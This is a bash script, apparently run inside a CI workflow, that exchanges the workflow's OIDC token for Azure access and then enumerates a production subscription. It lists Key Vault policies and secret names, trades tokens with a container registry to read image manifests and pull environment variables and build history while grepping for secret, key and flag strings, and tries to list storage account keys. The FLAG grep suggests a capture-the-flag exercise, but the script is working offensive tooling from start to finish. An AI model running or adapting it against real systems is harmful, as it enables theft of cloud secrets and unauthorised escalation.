#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE="https://management.azure.com"

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

ARM=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv)
KV_TOKEN=$(az account get-access-token --resource https://vault.azure.net --query accessToken -o tsv)

echo "=== KV PROD ACCESS POLICIES (via ARM) ==="
KV_PROPS=$(curl -sS "$ARM_BASE/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz?api-version=2023-07-01" \
  -H "Authorization: Bearer $ARM")
echo "$KV_PROPS" | python3 -c '
import sys,json
d=json.load(sys.stdin)
props=d.get("properties",{})
print("enableRbacAuthorization:", props.get("enableRbacAuthorization",""))
print("")
print("Access Policies:")
for ap in props.get("accessPolicies",[]):
    oid=ap.get("objectId","")
    perms=ap.get("permissions",{})
    secret_perms=perms.get("secrets",[])
    key_perms=perms.get("keys",[])
    cert_perms=perms.get("certificates",[])
    print(f"  OID={oid}")
    print(f"    secrets: {secret_perms}")
    print(f"    keys: {key_perms}")
    print(f"    certs: {cert_perms}")
' 2>/dev/null

echo ""
echo "=== KV SEC ACCESS POLICIES (via ARM) ==="
KV_SEC_PROPS=$(curl -sS "$ARM_BASE/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz?api-version=2023-07-01" \
  -H "Authorization: Bearer $ARM")
echo "$KV_SEC_PROPS" | python3 -c '
import sys,json
d=json.load(sys.stdin)
props=d.get("properties",{})
print("enableRbacAuthorization:", props.get("enableRbacAuthorization",""))
print("sku:", props.get("sku",{}).get("name",""))
print("softDeleteRetentionInDays:", props.get("softDeleteRetentionInDays",""))
print("")
print("Access Policies:")
for ap in props.get("accessPolicies",[]):
    oid=ap.get("objectId","")
    perms=ap.get("permissions",{})
    print(f"  OID={oid} secrets={perms.get(\"secrets\",[])} keys={perms.get(\"keys\",[])}")
' 2>/dev/null

echo ""
echo "=== LIST ALL SECRETS INCLUDING DISABLED/DELETED ==="
az keyvault secret list --vault-name kv-tbl-prod-x3euoz --include-managed true --output json 2>/dev/null | python3 -c '
import sys,json
secrets=json.load(sys.stdin)
for s in secrets:
    name=s["id"].rsplit("/",1)[-1]
    enabled=s.get("attributes",{}).get("enabled","")
    exp=s.get("attributes",{}).get("exp","")
    created=s.get("attributes",{}).get("created","")
    print(f"  {name} enabled={enabled}")
' 2>/dev/null || echo "list failed"

echo ""
echo "=== READ legacy-admin-principal VERSIONS ==="
az keyvault secret list-versions --vault-name kv-tbl-prod-x3euoz --name legacy-admin-principal 2>/dev/null \
  | python3 -c '
import sys,json
versions=json.load(sys.stdin)
print("Versions:", len(versions))
for v in versions:
    vid=v["id"].rsplit("/",1)[-1]
    enabled=v.get("attributes",{}).get("enabled","")
    print(f"  version={vid} enabled={enabled}")
' 2>/dev/null || echo "legacy-admin-principal not found"

echo ""
echo "=== ACR FULL EXPLORATION ==="
# Get ACR token using ARM token exchange
ACR_RT=$(curl -sS "https://crtblplatprodx3euoz.azurecr.io/oauth2/exchange" \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=access_token&service=crtblplatprodx3euoz.azurecr.io&access_token=$ARM" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("refresh_token",""))' 2>/dev/null)
echo "ACR refresh token len=${#ACR_RT}"

if [ "${#ACR_RT}" -gt 100 ]; then
  # List all repositories
  ACR_ACCESS=$(curl -sS "https://crtblplatprodx3euoz.azurecr.io/oauth2/token" \
    -X POST -H "Content-Type: application/x-www-form-urlencoded" \
    -d "grant_type=refresh_token&service=crtblplatprodx3euoz.azurecr.io&scope=registry:catalog:*&refresh_token=$ACR_RT" \
    | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)

  echo "ACR catalog token len=${#ACR_ACCESS}"
  if [ "${#ACR_ACCESS}" -gt 100 ]; then
    echo "--- All repos in ACR ---"
    curl -sS "https://crtblplatprodx3euoz.azurecr.io/v2/_catalog" \
      -H "Authorization: Bearer $ACR_ACCESS"
    echo ""
  fi

  # Get catalog-api token with proper scope
  CA_ACCESS=$(curl -sS "https://crtblplatprodx3euoz.azurecr.io/oauth2/token" \
    -X POST -H "Content-Type: application/x-www-form-urlencoded" \
    -d "grant_type=refresh_token&service=crtblplatprodx3euoz.azurecr.io&scope=repository:catalog-api:pull&refresh_token=$ACR_RT" \
    | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)

  echo "catalog-api pull token len=${#CA_ACCESS}"
  if [ "${#CA_ACCESS}" -gt 100 ]; then
    echo "--- catalog-api tags ---"
    curl -sS "https://crtblplatprodx3euoz.azurecr.io/v2/catalog-api/tags/list" \
      -H "Authorization: Bearer $CA_ACCESS"
    echo ""
    echo "--- catalog-api manifest:latest ---"
    MANIFEST=$(curl -sS "https://crtblplatprodx3euoz.azurecr.io/v2/catalog-api/manifests/latest" \
      -H "Authorization: Bearer $CA_ACCESS" \
      -H "Accept: application/vnd.docker.distribution.manifest.v2+json")
    echo "$MANIFEST" | head -c 3000
    echo ""

    # Extract layer digests and pull env from config blob
    echo "--- catalog-api config blob ---"
    CONFIG_DIGEST=$(echo "$MANIFEST" | python3 -c '
import sys,json
d=json.load(sys.stdin)
print(d.get("config",{}).get("digest",""))
' 2>/dev/null)

    if [ -n "$CONFIG_DIGEST" ]; then
      curl -sS "https://crtblplatprodx3euoz.azurecr.io/v2/catalog-api/blobs/$CONFIG_DIGEST" \
        -H "Authorization: Bearer $CA_ACCESS" | python3 -c '
import sys,json
d=json.load(sys.stdin)
cfg=d.get("config",{})
env=cfg.get("Env",[])
labels=cfg.get("Labels",{})
cmd=cfg.get("Cmd",[])
entrypoint=cfg.get("Entrypoint",[])
print("Env:", env)
print("Labels:", labels)
print("Cmd:", cmd)
print("Entrypoint:", entrypoint)
# Also check history for RUN commands
hist=d.get("history",[])
for h in hist:
    created_by=h.get("created_by","")
    if created_by and "ENV" in created_by.upper() or "SECRET" in created_by.upper() or "KEY" in created_by.upper() or "FLAG" in created_by.upper() or "DF26" in created_by:
        print("HISTORY:", created_by)
' 2>/dev/null
    fi
  fi
fi

echo ""
echo "=== CHECK APPCFG STORAGE WITH CICD-DEPLOYER ARM TOKEN ==="
# Try ARM list keys - unlikely to work but let's confirm
curl -sS -X POST \
  "$ARM_BASE/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-01-01" \
  -H "Authorization: Bearer $ARM" -H "Content-Length: 0" | head -c 300

echo ""
echo "=== STOREFRONT SAMI ROLE ASSIGNMENTS AT RESOURCE LEVEL ==="
SAMI="eeab432e-1bf6-400e-b155-a28ce7cafcdb"
curl -sS "$ARM_BASE/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
  -H "Authorization: Bearer $ARM" | python3 -c '
import sys,json
d=json.load(sys.stdin)
vals=d.get("value",[])
err=d.get("error",{})
if err: print("ERR:", err.get("code",""), err.get("message","")[:100])
else:
    print("Total:", len(vals))
    for r in vals:
        pid=r["properties"]["principalId"]
        role=r["properties"]["roleDefinitionId"].split("/")[-1]
        print(f"  pid={pid[:8]} role={role[:8]}")
' 2>/dev/null

echo ""
echo "=== ACR ROLE ASSIGNMENTS ==="
curl -sS "$ARM_BASE/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
  -H "Authorization: Bearer $ARM" | python3 -c '
import sys,json
d=json.load(sys.stdin)
vals=d.get("value",[])
err=d.get("error",{})
if err: print("ERR:", err.get("code",""), err.get("message","")[:100])
else:
    print("Total:", len(vals))
    for r in vals:
        pid=r["properties"]["principalId"]
        role=r["properties"]["roleDefinitionId"].split("/")[-1]
        print(f"  pid={pid[:8]} role={role[:8]}")
' 2>/dev/null

echo ""
echo "=== ALL RESOURCES IN PLATFORM RG ==="
curl -sS "$ARM_BASE/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/resources?api-version=2021-04-01" \
  -H "Authorization: Bearer $ARM" | python3 -c '
import sys,json
d=json.load(sys.stdin)
for r in d.get("value",[]):
    print(f"  {r.get(\"type\",\"\")} {r.get(\"name\",\"\")} {r.get(\"location\",\"\")}")
' 2>/dev/null

echo "DONE"
